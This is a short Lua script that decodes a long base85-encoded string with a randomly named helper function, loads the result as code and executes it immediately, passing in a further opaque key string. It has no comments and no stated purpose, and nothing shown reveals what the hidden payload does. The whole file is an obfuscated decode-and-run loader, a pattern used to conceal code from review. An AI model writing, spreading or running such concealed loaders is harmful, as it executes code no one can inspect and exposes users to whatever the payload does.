
local function BqYmionDSH(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
assert(load(BqYmionDSH("3LqdLAZ%}AVQe5rYi~kwcT-nsQ6N1ab98cPZf7oIXkl_FHZdzQH!L_YD>5@IGd3$TG%PeQD>F7MF*7SPG%PVPFfB7MEHyMMGBzwSI4d+VEIBzXGBhkPH8m|WHY_nPH!CqUEHN=TEipALIWQ|SIV?3ZD=|1MH!v$QI4m(TG%YeVEHo=LG%PVNF)J}REHN`MEipDMH!~|TIV?9eD>O7LF*P?WG%_qPH90LbF)T4KF)cGQEH^VNGBqqWFfB4MEH*SNF*z(VGb=JOEHN@TEipGNF*7tRGBhkUGb=MUEIBkSGBha)ARr(hY;R*>Y#?TJZew(5Z*Cw%Z%IW=Sy_2+Z75+ZVksbOZ)0I>AaE>WJuxgWJ0N#xX>4U6VLmV*VQyp~Vm>e+WN#pBZ)0I>AaY?Wa$-GUB{D2xB{Dl8X=WgDVSYVwVjy&AWo{s2J!30yAZ2c3J0M{!Vk~eyC}AyfVJR;%EGS|va$+ejGAwW^GCLq;Ze%+kX=Wf{JYpbpXk~67VLf6XWo~3UAa`hKY-J!}J}@9;Zy;=MV_|F{a$!ATB{Dl8X=WgDVLmV*bZBL6AY(maD{vrXZe%+kVJvVxC}AyfVJR;%EO06^J0N9lWIG^oWps6NZXjbjAZ2c3I|?8mARugSV_|F{W_503bZKvHAa8n6T4rf?W@mONWGo<SDGDGUARr(hARugSV_|F{b09q+dwn2gZ*m}MJuoaXH8mh)Zy<A9X<a>OAZ2c33LqdLARr(hAZ%}AVQe63AUz;33LqdLARr(hAZBlJAZa}?EHX7UAY^X}ARr(hARr(hARr(hY9KuzC~6=pAah%3T_7tUb98cPZf7oHd30qcYb+orX&@yaBWo!jD<Cl`DIg^vGBq{|ARr(hARr(hARr(hb6aU$EFg1RYF!{bAah%4T`VATTWMViARr(hARr(hWo~2&ARr(hARr(hY;R*>Y#?bYAa8YaAUz;3EFgP*3LqdLARr(hAZj2zATSCbARr(hARr)SZ*m}MWOzL>EFdFfAY^X}ARr(hARr(hARr(hX&^lyC}|)oATcQ*B_J|2HVPmhARr(hARr(hARuZWJs>D*AS)nqTWMV>ASEC&H8u($ARr(hARr(hARr)fTWMV^Aah%4T_8Omb6aX%EFg1RX<Z5+ARr(hARr(hARr)bb#z-JZ*_DlF<l@%AaitbX>MmOV`yP=C_`^aMNC;)d2ekfb98cPZf7oHd30qcWGo<QWOykoAah$Nb6aU$AS)nqTWVb?ASEC&H8x!-DGDGUARr(hARuLKWC|c4ARr(hARuyObairWAar43Y-KKEZ*F5@bSQ6ibSVlTARr)RZe$7|ARr)eWps6NZXjlLZew(5Z*C}XUt%~lDGDGUARr(hARugSV_|F{ZDDXAJs^913LqdLARr(hAZ%}AVQe5{Xkl`5AUz-=FflSSG&MFiI5|N=LqtVJM@UIZOH55pPf$@(Q&d$}S6EqEVPa!sWoBn+X=-b1ZEkOHadLBXb#`}nd3qruBqb&&DJm;1J3Ku;KR{kzV0(Ohej*AWARr(hARr)SZ*m}MJuxgeH6UbfAZ=lATXS@BX>MmOVtI6BC}U`0a&s(cDP15vAZaZzAZ2c33LqdLARr(hAZ%}AVQe68b#yEsc42HRAY*TJZge0$AbWi*ATTT-FbW_bARr(hARugSV_|F{aBp{WAUz;^H8L_VFg7wZEFd;9G%+$YEFd>BGBqq9I5jLFF?|XkARr(hARr)SZ*m}MJuxgGBXD10I5i+-ZweqFARr(hARr(hARugSV_|F{b|5_<ZDDX*b98cPZf7oHd30qca9?6LH7p=$DP0O6ARr(hARr(hARr)VW*~MTbZBL63LqdLARr(hARr(hARr(hAa-GFAUz;<VQe5PAa)=sAaHMYb6aC?b#8PkF<lBEARr(hARr(hARr(hARr)PZ*^{TAUz;sZ*^{TAS)m-3LqdLARr(hARr(hARr(hAZcbGV{dhCbRa!FAT=O#Xk~5+ARr(hARr(hARr(hARr(hARr(hbYWs_WiDxMb7gXLC~tLiEFg1qa%pa7E@Nn6awu(KbZ9PSY;SLJD0X3NFEKVZH#agdHYqG1ZDDk1E@o_RZ*nLoc42HKF*Y|hH!?9cDK9oPH8VCTEFf)RbZ9PSY;SLJC@6MeY$Y}|H8VCTFETYYDJ&p%VQeKbH8v?J3LqdLARr(hARr(hARr(hARr(hAa-GFEFfcVb#8PZJs>bFATSCbARr(hARr(hARr(hARr)RZe$7|ARr(hARr(hARr)RZe$7|ARr(hARr)RZe$7|ARr(hARr)YZ)0I>AY^4@a(QrcWn>^dAa8n6T4rf?W@mONbYWs_WiDfHZew9|C~tLiDJ&pIYi~kwcT-nsQ7H-_ARr(hARr)Nb8}^KbSP|ZVPq&|Wn*%AaCBv4DJdu^3LqdLAZ2c33LqdLAO")))()("vR-s(x_!RGYxXAhjuA{%MWxda(Dl3`uTzu")
